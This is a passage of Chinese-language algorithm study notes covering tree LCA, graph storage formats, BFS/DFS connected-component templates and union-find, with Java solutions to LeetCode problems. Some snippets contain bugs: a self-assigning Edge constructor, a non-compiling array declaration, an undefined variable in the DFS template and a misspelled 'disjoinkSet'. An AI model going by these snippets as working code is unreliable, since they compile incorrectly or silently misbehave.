1];\n    }\n    for (int[] child : tree[v]) {\n      dep[child[0]] = dep[v] + 1;\n      dist[child[0]] = dist[v] + child[1];\n      F[child[0]][0] = v;\n      dfs(child[0]);\n    }\n  }\n\n  /**\n   * 查询x节点与y节点的最近公共祖先\n   */\n  int getLCA(int x, int y) {\n    if (dep[x] < dep[y]) {\n      int temp = x;\n      x = y;\n      y = temp;\n    }\n    for (int i = k; i >= 0; i--) {\n      if (dep[F[x][i]] >= dep[y]) {\n        x = F[x][i];\n      }\n      if (x == y) {\n        return x;\n      }\n    }\n    for (int i = k; i >= 0; i--) {\n      if (F[x][i] != F[y][i]) {\n        x = F[x][i];\n        y = F[y][i];\n      }\n    }\n    return F[x][0];\n  }\n\n  /**\n   * 查询x节点与y节点的之间的距离\n   */\n  int getDist(int x, int y) {\n    int lac = getLCA(x, y);\n    return dist[x] + dist[y] - 2 * dist[lac];\n  }\n\n}\n```\n\n# 图论\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1tR9QKcnBXvdVaQQOByffi8BKGjrXuxIA/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/OBEHTlAdUrI\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/w89GTZApgIs\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n## 图的逻辑结构和具体实现\n### 邻接表与邻接矩阵\n参考：\n- https://labuladong.gitee.io/algo/2/20/47/\n\n---\n\n一幅图是由节点和边构成的，逻辑结构如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220531152018.png)\n\n\n**什么叫「逻辑结构」？就是说为了方便研究，我们把图抽象成这个样子。**\n\n根据这个逻辑结构，我们可以认为每个节点的实现如下：\n```java\n/* 图节点的逻辑结构 */\nclass Vertex {\n    int id;\n    Vertex[] neighbors;\n}\n```\n\n看到这个实现，你有没有很熟悉？它和我们之前说的多叉树节点几乎完全一样：\n```java\n/* 基本的 N 叉树节点 */\nclass TreeNode {\n    int val;\n    TreeNode[] children;\n}\n```\n\n所以说，图真的没啥高深的，本质上就是个高级点的多叉树而已，适用于树的 DFS/BFS 遍历算法，全部适用于图。\n\n不过呢，上面的这种实现是「逻辑上的」，实际上我们很少用这个`Vertex`类实现图，而是用常说的邻接表和邻接矩阵来实现。\n\n比如还是刚才那幅图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220531152313.png)\n\n用邻接表和邻接矩阵的存储方式如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220531152338.png)\n\n邻接表很直观，我把每个节点`x`的邻居都存到一个列表里，然后把`x`和这个列表关联起来，这样就可以通过一个节点`x`找到它的所有相邻节点。\n\n邻接矩阵则是一个二维布尔数组，我们权且称为`matrix`，如果节点`x` 和 `y` 是相连的，那么就把 `matrix[x][y]` 设为 `true`（上图中绿色的方格代表 `true`）。如果想找节点 `x` 的邻居，去扫一圈 `matrix[x][..]` 就行了。\n\n如果用代码的形式来表现，邻接表和邻接矩阵大概长这样：\n\n```java\n// 邻接表\n// graph[x] 存储节点x 的所有邻居节点\nList<Integer>[] graph;\n\n// 邻接矩阵\n// matrix[x][y] 记录节点x 是否有一条指向 y 的边\nboolean[][] matrix;\n```\n\n**那么，为什么有这两种存储图的方式呢？肯定是因为他们各有优劣。**\n\n对于邻接表，好处是占用的空间少。\n\n你看邻接矩阵里面空着那么多位置，肯定需要更多的存储空间。\n\n但是，邻接表无法快速判断两个节点是否相邻。\n\n比如说我想判断节点 1 是否和节点 3 相邻，我要去邻接表里 1 对应的邻居列表里查找 3 是否存在。但对于邻接矩阵就简单了，只要看看 `matrix[1][3]` 就知道了，效率高。\n\n所以说，使用哪一种方式实现图，要看具体情况。\n\n> PS：在常规的算法题中，邻接表的使用会更频繁一些，主要是因为操作起来较为简单，但这不意味着邻接矩阵应该被轻视。矩阵是一个强有力的数学工具，图的一些隐晦性质可以借助精妙的矩阵运算展现出来。不过本文不准备引入数学内容，所以有兴趣的读者可以自行搜索学习。\n\n那你可能会问，我们上面说的这个图的模型仅仅是「有向无权图」，不是还有什么加权图，无向图，等等……\n\n其实，这些更复杂的模型都是基于这个最简单的图衍生出来的。\n\n有向加权图怎么实现？很简单呀：\n\n如果是邻接表，我们不仅仅存储某个节点 x 的所有邻居节点，还存储 x 到每个邻居的权重，不就实现加权有向图了吗？\n\n如果是邻接矩阵，`matrix[x][y]` 不再是布尔值，而是一个 int 值，0 表示没有连接，其他值表示权重，不就变成加权有向图了吗？\n\n如果用代码的形式来表现，大概长这样：\n\n```java\n// 邻接表\n// graph[x] 存储节点x 的所有邻居节点以及对应的权重\n// from -> List<(to, weight)>\n// graph[from].add(new int[]{to, weight}); \nList<int[]>[] graph;\n\n// 邻接矩阵\n// matrix[x][y] 记录 x 指向 y 的边的权重，0 表示不相邻\nint[][] matrix;\n```\n\n无向图怎么实现？也很简单，所谓的「无向」，是不是等同于「双向」？\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220531152900.png)\n\n如果连接无向图中的节点 x 和 y，把`matrix[x][y]`和`matrix[y][x]` 都变成 true 不就行了；邻接表也是类似的操作，在 x 的邻居列表里添加 y，同时在 y 的邻居列表里添加 x。\n\n把上面的技巧合起来，就变成了无向加权图\n\n### 边集数组\n边集数组由两个一维数组构成：\n- 一个存储顶点信息。\n- 一个存储边的信息，这个边数组每个数据元素由一条边的起点下标（begin）、终点下标（end）、和权（weight）组成。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220602095849.png)\n\n实现方式：\n```java\nint[][] edges =  { {0,1,100}, {1,2,100}, {0,2,500} }\n```\n\n```java\nEdge[] edges = new ArrayList();\nedges.add(new Edge(0, 1, 100));\nedges.add(new Edge(1, 2, 100));\nedges.add(new Edge(0, 2, 500));\n\nclass Edge {\n  int begin, end, weight;\n\n  Edge(int begin, int end, int weight) {\n    begin = begin;\n    end = end;\n    weight = weight;\n  }\n}\n```\n\n边集数组适用场景：\n- 边集数组关注的是边的集合，在边集数组中要查找一个顶点的度需要扫描整个边数组，效率并不高。\n- 因此它更适合对边依次进行处理的操作，而不适合对顶点相关的操作。\n\n例如： Bellman-Ford算法中使用了边集数组来存储图\n\n### 链式前向星\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/CrQSuA9JibU\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/fNPI5UQeJjU\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe src=\"https://docs.google.com/document/d/e/2PACX-1vSE5-XNTFLefwz5oVJlJh21f_K5cGuikjhPQghcZZgmxqQV0GktdWsjTq3FhD3Ib8bABMLkv8awhsMb/pub?embedded=true\"></iframe>\n</div>\n\n## 无向图的连通性\n### 静态图的算法 -- DFS/BFS\n#### BFS实现模版\n```java\nint findComponents() {\n  // key表示节点/状态，value表示该节点/状态所属于的连通分支。\n  // 该components可以作为visited使用, 即当componets.containsKey(i) == false时，表示i节点没有被访问，反之，则被访问了\n  Map<State, Integer> components = new HashMap<>();\n\n  // 现在所求的连通分支标识\n  int currentComponent = 0;\n\n  // 遍历每个节点/状态\n  for (State state : States) {\n    if (!components.containsKey(state)) {\n      bfs(state, components, currentComponent++);\n    }\n  }\n  return currentComponent;\n}\n\nvoid bfs(State startState, Map<State, Integer> components, Integer currentComponent) {\n  Queue<State> queue = new LinkedList();\n\n  queue.add(startState);\n  components.put(startState, currentComponent);\n\n  while (!queue.isEmpty()) {\n    State currentState = queue.poll();\n\n    // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n    List<State> nextStates = transition(currentState);\n\n    for (State nextState : nextStates) {\n      if (components.containsKey(nextState)) continue;\n      queue.add(nextState);\n      components.put(nextState, currentComponent);\n    }\n  }\n}\n\nclass State {\n\n}\n```\n\n#### DFS实现模版\n```java\nint findComponents() {\n  // key表示节点/状态，value表示该节点/状态所属于的连通分支。\n  // 该components可以作为visited使用, 即当componets.containsKey(i) == false时，表示i节点没有被访问，反之，则被访问了\n  Map<State, Integer> components = new HashMap<>();\n\n  // 现在所求的连通分支标识\n  int currentComponent = 0;\n\n  // 遍历每个节点/状态\n  for (State state : States) {\n    if (!components.containsKey(state)) {\n      dfs(state, components, currentComponent++);\n    }\n  }\n  return currentComponent;\n}\n\nvoid dfs(State startState, Map<State, Integer> components, Integer currentComponent) {\n  components.put(startState, currentComponent);\n\n  // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n  List<State> nextStates = transition(currentState);\n\n  for (State nextState : nextStates) {\n    if (components.containsKey(nextState)) continue;\n    dfs(nextState, components, currentComponent);\n  }\n}\n\nclass State {\n\n}\n```\n\n#### 例题1: 省份数量\n[省份数量](https://leetcode.cn/problems/number-of-provinces/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220605223032.png)\n\nBFS代码：\n```java\nclass Solution {\n  int[][] isConnected;\n  public int findCircleNum(int[][] isConnected) {\n    this.isConnected = isConnected; \n    return findComponents();\n  }\n\n  int findComponents() {\n    Map<Integer, Integer> components = new HashMap(); \n    \n    int currentComponent = 0;\n    \n    for (int i = 0; i < isConnected.length; i++) {\n      if (!components.containsKey(i)) {\n        bfs(i, components, currentComponent++);\n      }\n    }\n    return currentComponent;\n  }\n\n  void bfs(Integer startState, Map<Integer, Integer> components, Integer currentComponent) {\n    Queue<Integer> queue = new LinkedList();\n\n    queue.add(startState);\n    components.put(startState, currentComponent);\n\n    while (!queue.isEmpty()) {\n      Integer currentState = queue.poll();\n\n      List<Integer> nextStates = new ArrayList();\n      for (int i = 0; i < isConnected.length; i++) {\n        if (isConnected[currentState][i] == 1) {\n          nextStates.add(i);\n        }\n      }\n\n      for (Integer nextState : nextStates) {\n        if (components.containsKey(nextState)) continue;\n        queue.add(nextState);\n        components.put(nextState, currentComponent);\n      }\n      \n    }\n  }\n}\n```\n\nDFS代码:\n```java\nclass Solution {\n  int[][] isConnected;\n\n  public int findCircleNum(int[][] isConnected) {\n    this.isConnected = isConnected; \n    return findComponents();\n  }\n\n  int findComponents() {\n    Map<Integer, Integer> components = new HashMap(); \n    \n    int currentComponent = 0;\n    \n    for (int i = 0; i < isConnected.length; i++) {\n      if (!components.containsKey(i)) {\n        dfs(i, components, currentComponent++);\n      }\n    }\n    return currentComponent;\n  }\n\n  void dfs(Integer currentState, Map<Integer, Integer> components, Integer currentComponent) {\n    components.put(currentState, currentComponent);\n\n    List<Integer> nextStates = new ArrayList();\n    for (int i = 0; i < isConnected.length; i++) {\n      if (isConnected[currentState][i] == 1) {\n        nextStates.add(i);\n      }\n    }\n\n    for (Integer nextState : nextStates) {\n      if (components.containsKey(nextState)) continue;\n      dfs(nextState, components, currentComponent);\n    }\n\n  }\n}\n```\n\n#### 例题2: 岛屿数量\n[岛屿数量](https://leetcode.cn/problems/number-of-islands/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220605230048.png)\n\nBFS代码:\n```java\nclass Solution {\n  \n  char[][] grid;\n\n  public int numIslands(char[][] grid) {\n    this.grid = grid;\n    return findComponents();\n  }\n\n  int findComponents() {\n    // key表示节点/状态，value表示该节点/状态所属于的连通分支。\n    // 该components可以作为visited使用, 即当componets.containsKey(i) == false时，表示i节点没有被访问，反之，则被访问了\n    Map<State, Integer> components = new HashMap<>();\n  \n    // 现在所求的连通分支标识\n    int currentComponent = 0;\n  \n    // 遍历每个节点/状态\n    for (int r = 0; r < grid.length; r++) {\n      for (int c = 0; c < grid[0].length; c++) {\n        if (grid[r][c] == '1') {\n          State state = new State(r, c);  \n          if (!components.containsKey(state)) {\n            bfs(state, components, currentComponent++);\n          }\n        }\n      }\n    }\n    return currentComponent;\n  }\n  \n  void bfs(State startState, Map<State, Integer> components, Integer currentComponent) {\n    Queue<State> queue = new LinkedList();\n  \n    queue.add(startState);\n    components.put(startState, currentComponent);\n  \n    while (!queue.isEmpty()) {\n      State currentState = queue.poll();\n  \n      // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n      List<State> nextStates = new ArrayList();\n      int[] dr = new int[]{-1, 1, 0, 0};\n      int[] dc = new int[]{0, 0, -1, 1};\n      for (int i = 0; i < 4; i++) {\n        int nr = currentState.row + dr[i];\n        int nc = currentState.col + dc[i];\n        if (nr >= 0 && nr < grid.length && nc >= 0 && nc < grid[0].length && grid[nr][nc] == '1') {\n          nextStates.add(new State(nr, nc));\n        }\n      }\n  \n      for (State nextState : nextStates) {\n        if (components.containsKey(nextState)) continue;\n        queue.add(nextState);\n        components.put(nextState, currentComponent);\n      }\n    }\n  }\n\n  class State {\n    int row;\n    int col;\n\n    public State(int row, int col) {\n      this.row = row;\n      this.col = col;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null || getClass() != o.getClass()) return false;\n      State state = (State) o;\n      return row == state.row && col == state.col;\n    }\n\n    @Override\n    public int hashCode() {\n      return Objects.hash(row, col);\n    }\n  }\n}\n```\n\nDFS代码：\n```java\nclass Solution {\n  \n  char[][] grid;\n\n  public int numIslands(char[][] grid) {\n    this.grid = grid;\n    return findComponents();\n  }\n\n  int findComponents() {\n    // key表示节点/状态，value表示该节点/状态所属于的连通分支。\n    // 该components可以作为visited使用, 即当componets.containsKey(i) == false时，表示i节点没有被访问，反之，则被访问了\n    Map<State, Integer> components = new HashMap<>();\n  \n    // 现在所求的连通分支标识\n    int currentComponent = 0;\n  \n    // 遍历每个节点/状态\n    for (int r = 0; r < grid.length; r++) {\n      for (int c = 0; c < grid[0].length; c++) {\n        if (grid[r][c] == '1') {\n          State state = new State(r, c);  \n          if (!components.containsKey(state)) {\n            dfs(state, components, currentComponent++);\n          }\n        }\n      }\n    }\n    return currentComponent;\n  }\n  \n  void dfs(State currentState, Map<State, Integer> components, Integer currentComponent) {\n    components.put(currentState, currentComponent);\n  \n    // 获取当前状态可以转换到的所有下一个状态。此时不需要考虑这个状态是否能被添加到队列中\n    List<State> nextStates = new ArrayList();\n    int[] dr = new int[]{-1, 1, 0, 0};\n    int[] dc = new int[]{0, 0, -1, 1};\n    for (int i = 0; i < 4; i++) {\n      int nr = currentState.row + dr[i];\n      int nc = currentState.col + dc[i];\n      if (nr >= 0 && nr < grid.length && nc >= 0 && nc < grid[0].length && grid[nr][nc] == '1') {\n        nextStates.add(new State(nr, nc));\n      }\n    }\n  \n    for (State nextState : nextStates) {\n      if (components.containsKey(nextState)) continue;\n      dfs(nextState, components, currentComponent);\n    }\n  }\n\n  class State {\n    int row;\n    int col;\n\n    public State(int row, int col) {\n      this.row = row;\n      this.col = col;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n      if (this == o) return true;\n      if (o == null || getClass() != o.getClass()) return false;\n      State state = (State) o;\n      return row == state.row && col == state.col;\n    }\n\n    @Override\n    public int hashCode() {\n      return Objects.hash(row, col);\n    }\n  }\n}\n```\n\n#### 例题3：统计无向图中无法互相到达点对数\n[统计无向图中无法互相到达点对数](https://leetcode.cn/problems/count-unreachable-pairs-of-nodes-in-an-undirected-graph/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220718160200.png)\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/P8cpKzUJP_Q\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n- 对于无向图，有`n(n-1)/2`条边的无向图称为完全图，在完全图中任意两个顶点之间都存在边\n- 对于有向图，有`n(n-1)`条边的有向图称为有向完全图，在有向完全图中任意两个顶点之间都存在方向相反的两条弧\n\nBFS代码：\n```java\nclass Solution {\n  List<Integer>[] graph;\n  int n;\n  // key为连通分量标识，value为该连通分量中节点的个数\n  Map<Integer, Integer> size = new HashMap();\n  public long countPairs(int n, int[][] edges) {\n    this.n = n;\n    graph = new List[n];\n    for (int i = 0; i < n; i++) {\n      graph[i] = new ArrayList();\n    }\n    for (int i = 0; i < edges.length; i++) {\n      graph[edges[i][0]].add(edges[i][1]);\n      graph[edges[i][1]].add(edges[i][0]);\n    }\n\n    findComponents();\n    long res = (long) n * (n - 1) / 2;\n    for (Integer key : size.keySet()) {\n      int temp = size.get(key);\n      res -= (long) temp * (temp - 1) / 2; \n    }\n    return res;\n  }\n\n  int findComponents() {\n    Map<Integer, Integer> components = new HashMap();\n    int currentComponent = 0;\n    for (int i = 0; i < n; i++) {\n      if (!components.containsKey(i)) {\n        size.put(currentComponent, size.getOrDefault(currentComponent, 0) + 1);\n        bfs(i, components, currentComponent++);\n      }\n    } \n    return currentComponent;\n  }\n\n  void bfs(Integer startState, Map<Integer, Integer> components, Integer currentComponent) {\n    Queue<Integer> queue = new LinkedList();\n    queue.add(startState);\n    components.put(startState, currentComponent);\n\n    while (!queue.isEmpty()) {\n      Integer currentState = queue.poll();\n      for (Integer nextState : graph[currentState]) {\n        if (components.containsKey(nextState)) continue;\n        queue.add(nextState);\n        components.put(nextState, currentComponent);\n        size.put(currentComponent, size.getOrDefault(currentComponent, 0) + 1);\n      }\n    }\n  }\n\n}\n```\n\nDFS代码：\n```java\nclass Solution {\n  List<Integer>[] graph;\n  int n;\n  // key为连通分量标识，value为该连通分量中节点的个数\n  Map<Integer, Integer> size = new HashMap();\n  public long countPairs(int n, int[][] edges) {\n    this.n = n;\n    graph = new List[n];\n    for (int i = 0; i < n; i++) {\n      graph[i] = new ArrayList();\n    }\n    for (int i = 0; i < edges.length; i++) {\n      graph[edges[i][0]].add(edges[i][1]);\n      graph[edges[i][1]].add(edges[i][0]);\n    }\n\n    findComponents();\n    long res = (long) n * (n - 1) / 2;\n    for (Integer key : size.keySet()) {\n      int temp = size.get(key);\n      res -= (long) temp * (temp - 1) / 2; \n    }\n    return res;\n  }\n\n  int findComponents() {\n    Map<Integer, Integer> components = new HashMap();\n    int currentComponent = 0;\n    for (int i = 0; i < n; i++) {\n      if (!components.containsKey(i)) {\n        size.put(currentComponent, size.getOrDefault(currentComponent, 0) + 1);\n        dfs(i, components, currentComponent++);\n      }\n    } \n    return currentComponent;\n  }\n\n  void dfs(Integer currentState, Map<Integer, Integer> components, Integer currentComponent) {\n    components.put(currentState, currentComponent);\n    for (Integer nextState : graph[currentState]) {\n      if (components.containsKey(nextState)) continue;\n      size.put(currentComponent, size.getOrDefault(currentComponent, 0) + 1);\n      dfs(nextState, components, currentComponent);\n    }\n  }\n\n}\n```\n\n### 动态(递增)图的算法 - 并查集\n#### 没有权值的并查集\n##### 模版\n```java\nclass DisjointSet {\n  int[] parent;\n  // 连通分量的个数\n  int cnt;\n\n  public DisjointSet(int n) {\n    cnt = n;\n    // 初始化parent\n    parent = new int[n];\n    for (int i = 0; i < n; i++) {\n      parent[i] = i;\n    }\n  }\n\n  // 查找x属于哪个连通分支\n  int findParent(int x) {\n    if (x == parent[x]) {\n      return x; \n    } \n    parent[x] = findParent(parent[x]);\n    return parent[x];\n  }\n\n  // 合并2个连通分支\n  void unionSets(int a, int b) {\n    a = findParent(a);\n    b = findParent(b);\n    if (a != b) {\n      parent[a] = b;\n      cnt--;\n    }\n  }\n}\n``` \n\n\n##### 例题1: 等式方程的可满足性\n[等式方程的可满足性](https://leetcode.cn/problems/satisfiability-of-equality-equations/)\n\n给定一个由表示变量之间关系的字符串方程组成的数组，每个字符串方程 equations[i] 的长度为 4，并采用两种不同的形式之一：\"a==b\" 或 \"a!=b\"。在这里，a 和 b 是小写字母（不一定不同），表示单字母变量名。\n\n只有当可以将整数分配给变量名，以便满足所有给定的方程时才返回 true，否则返回 false。 \n\n示例 1：\n```txt\n输入：[\"a==b\",\"b!=a\"]\n输出：false\n解释：如果我们指定，a = 1 且 b = 1，那么可以满足第一个方程，但无法满足第二个方程。没有办法分配变量同时满足这两个方程。\n```\n\n示例 2：\n```txt\n输入：[\"b==a\",\"a==b\"]\n输出：true\n解释：我们可以指定 a = 1 且 b = 1 以满足满足这两个方程。\n```\n\n示例 3：\n```txt\n输入：[\"a==b\",\"b==c\",\"a==c\"]\n输出：true\n```\n\n###### 分析\n- \"a==b\"可以看成a与b属于同一分支\n- \"a!=b\"可以看成a与b不属于同一分支\n\n如果一个等式中\"a==b\", \"a!=b\", 则表明a与b属于同一分支, 也不属于同一分支。这显然是矛盾的\n\n代码：\n```java\nclass Solution {\n\n  public boolean equationsPossible(String[] equations) {\n    DisjointSet disjointSet = new DisjointSet(26);\n    for (String equation : equations) {\n      if (equation.charAt(1) == '=') {\n        disjointSet.unionSets(equation.charAt(0) - 'a', equation.charAt(3) - 'a');\n      }\n    }\n\n    for (String equation : equations) {\n      if (equation.charAt(1) == '!') {\n        if (disjointSet.findParent(equation.charAt(0) - 'a') == disjointSet.findParent(equation.charAt(3)- 'a')) return false;\n      }\n    }\n    return true;\n  }\n\n  class DisjointSet {\n    int[] parent;\n\n    public DisjointSet(int n) {\n      parent = new int[n];\n      for (int i = 0; i < n; i++) {\n        parent[i] = i;\n      }\n    }\n\n    int findParent(int x) {\n      if (x == parent[x]) {\n        return x; \n      } \n      parent[x] = findParent(parent[x]);\n      return parent[x];\n    }\n  \n    void unionSets(int a, int b) {\n      a = findParent(a);\n      b = findParent(b);\n      if (a != b) {\n        parent[a] = b;\n      }\n    }\n  }\n\n}\n```\n\n##### 例题2: 连通网络的操作次数\n[连通网络的操作次数](https://leetcode.cn/problems/number-of-operations-to-make-network-connected/)\n\n用以太网线缆将 n 台计算机连接成一个网络，计算机的编号从 0 到 n-1。线缆用 connections 表示，其中 connections[i] = [a, b] 连接了计算机 a 和 b。\n\n网络中的任何一台计算机都可以通过网络直接或者间接访问同一个网络中其他任意一台计算机。\n\n给你这个计算机网络的初始布线 connections，你可以拔开任意两台直连计算机之间的线缆，并用它连接一对未直连的计算机。请你计算并返回使所有计算机都连通所需的最少操作次数。如果不可能，则返回 -1 。\n\n示例 1：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220528101836.png)\n\n输入：n = 6, connections = [[0,1],[0,2],[0,3],[1,2],[1,3]]\n输出：2\n\n###### 分析\n将m个连通分支相连至少需要m-1个边\n\n代码:\n```java\nclass Solution {\n  public int makeConnected(int n, int[][] connections) {\n    DisjointSet disjointSet = new DisjointSet(n);\n    // 多余的缆线个数\n    int redundant = 0;\n    // 存储已经每个节点位于哪个连通分支中\n    for (int i = 0; i < connections.length; i++) {\n      int a =  connections[i][0];\n      int b =  connections[i][1];\n      if (disjointSet.findParent(a) == disjointSet.findParent(b)) {\n        redundant++;\n      } else {\n        disjointSet.unionSets(a, b);\n      }\n    }\n    // 查看连通分支的个数\n    int componentNum = 0;\n    for (int i = 0; i < n; i++) {\n      if (disjointSet.parent[i] == i) componentNum++;\n    }\n\n    // 将m个连通分支相连至少需要m-1个边\n    if (redundant >= componentNum - 1) {\n      return componentNum - 1;\n    }\n    return -1;\n  }\n\n  class DisjointSet {\n    int[] parent;\n\n    public DisjointSet(int n) {\n      parent = new int[n];\n      for (int i = 0; i < n; i++) {\n        parent[i] = i;\n      }\n    }\n\n    int findParent(int x) {\n      if (x == parent[x]) {\n        return x; \n      } \n      parent[x] = findParent(parent[x]);\n      return parent[x];\n    }\n  \n    void unionSets(int a, int b) {\n      a = findParent(a);\n      b = findParent(b);\n      if (a != b) {\n        parent[a] = b;\n      }\n    }\n  }\n\n}\n```\n\n##### 例题3: 交换字符串中的元素\n[交换字符串中的元素](https://leetcode.cn/problems/smallest-string-with-swaps/)\n\n给你一个字符串 s，以及该字符串中的一些「索引对」数组 pairs，其中 pairs[i] = [a, b] 表示字符串中的两个索引（编号从 0 开始）。\n\n你可以 任意多次交换 在 pairs 中任意一对索引处的字符。\n\n返回在经过若干次交换后，s 可以变成的按字典序最小的字符串。\n\n示例 1:\n```txt\n输入：s = \"dcab\", pairs = [[0,3],[1,2]]\n输出：\"bacd\"\n解释： \n交换 s[0] 和 s[3], s = \"bcad\"\n交换 s[1] 和 s[2], s = \"bacd\"\n```\n\n###### 分析\n\n参考：https://leetcode.cn/problems/smallest-string-with-swaps/solution/1202-jiao-huan-zi-fu-chuan-zhong-de-yuan-wgab/\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/f4I4FGDFKRc\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public String smallestStringWithSwaps(String s, List<List<Integer>> pairs) {\n    DisjointSet disjointSet = new DisjointSet(s.length());\n    \n    // 将任意能交换的节点纳入一个连通分支中\n    for (List<Integer> pair : pairs) {\n      disjointSet.unionSets(pair.get(0), pair.get(1));\n    }\n\n    // 构建映射关系\n    char[] charArray = s.toCharArray();\n    // key：连通分支代表元。value：同一连通分支中的字符集合，保存在一个优先队列中\n    Map<Integer, PriorityQueue<Character>> map = new HashMap();\n    for (int i = 0; i < s.length(); i++) {\n      int root = disjointSet.findParent(i);\n      if (map.containsKey(root)) {\n        map.get(root).offer(charArray[i]);\n      } else {\n        PriorityQueue<Character> minHeap = new PriorityQueue();\n        minHeap.offer(charArray[i]);\n        map.put(root, minHeap);\n      }\n    }\n\n    // 重组字符串\n    StringBuffer sb = new StringBuffer();\n    for (int i = 0; i < s.length(); i++) {\n      int root = disjointSet.findParent(i);\n      sb.append(map.get(root).poll());\n    }\n    return sb.toString();\n  }\n\n  class DisjointSet {\n    int[] parent;\n    \n    public DisjointSet(int n) {\n      parent = new int[n];\n      for (int i = 0; i < n; i++) {\n        parent[i] = i;\n      }\n    }\n\n    int findParent(int x) {\n      if (x == parent[x]) {\n        return x;\n      }\n      parent[x] = findParent(parent[x]);\n      return parent[x];\n    }\n\n    void unionSets(int a, int b) {\n      a = findParent(a);\n      b = findParent(b);\n      if (a != b) {\n        parent[a] = b;\n      }\n    }\n\n  }\n\n}\n```\n##### 例题4: 由斜杠划分区域\n[由斜杠划分区域](https://leetcode.cn/problems/regions-cut-by-slashes/)\n\n在由 1 x 1 方格组成的 n x n 网格 grid 中，每个 1 x 1 方块由 `'/'`、`'\\'` 或空格构成。这些字符会将方块划分为一些共边的区域。\n\n给定网格 grid 表示为一个字符串数组，返回 区域的数量 。\n\n请注意，反斜杠字符是转义的，因此 `'\\'` 用 `'\\\\'` 表示。\n\n###### 分析\n文字讲解：https://leetcode.cn/problems/regions-cut-by-slashes/solution/you-xie-gang-hua-fen-qu-yu-by-leetcode-67xb/\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/1XptDhgm4KE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public int regionsBySlashes(String[] grid) {\n    int n = grid.length;\n    DisjointSet disjointSet = new DisjointSet(4 * n * n);\n    \n    for (int r = 0; r < n; r++) {\n      char[] rowStr = grid[r].toCharArray();\n      for (int c = 0; c < n; c++) {\n        int index = 4 * (n * r + c);\n\n        // 单元格内合并\n        if (rowStr[c] == '/'){\n          // 合并0, 3 \n          disjoinkSet.unionSets(index, index + 3); \n          // 合并1, 2\n          disjointSet.unionSets(index + 1, index + 2); \n        } else if (rowStr[c] == '\\\\') {\n          // 合并0， 1\n          disjointSet.unionSets(index, index + 1);\n          // 合并2， 3\n          disjointSet.unionSets(index + 2, index + 3);\n        } else {\n          // 合并0,1,2,3\n          disjointSet.unionSets(index, index + 1);\n          disjointSet.unionSets(index + 1, index + 2);\n          disjointSet.unionSets(index + 2, index + 3);\n        }\n        \n        // 单元格间合并\n        // 合并1， 3  \n        if (c + 1 < n) {\n          disjointSet.unionSets(index + 1, index + 4 + 3);\n        }\n        // 合并2, 0\n        if (r + 1 <n) {\n          disjointSet.unionSets(index + 2, 4 * (n * (r + 1) + c)); \n        }\n        \n      }\n    }\n    return disjointSet.cnt;\n  }\n\n  class DisjointSet {\n    int[] parent;\n    int cnt;\n    \n    public DisjointSet(int n) {\n      cnt = n;\n      parent = new int[n];\n      for (int i = 0; i < n; i++) {\n        parent[i] = i;\n      }\n    }\n\n    int findParent(int x) {\n      if (x == parent[x]) {\n        return x;\n      }\n      return parent[x] = findParent(parent[x]);\n    }\n    \n    void unionSets(int a, int b) {\n      a = findParent(a);\n      b = findParent(b);\n      if (a != b) {\n        parent[a] = b;\n        cnt--;\n      }\n    }\n  }\n}\n```\n\n#### 有权值的并查集\n##### 模版\n```java\nclass DisjointSet {\n  int[] parent;\n  // weight[x]表示节点x指向父节点的权值\n  double[] weight;\n  // 连通分量的个数\n  int cnt;\n\n  public DisjointSet(int n) {\n    cnt = n;\n    parent = new int[n];\n    weight = new double[n];\n    for (int i = 0; i < n; i++) {\n      parent[i] = i;\n      // 权值初始化, 如何初始化，根据情况而定\n      weight[i] = 1;\n    }\n  }\n\n 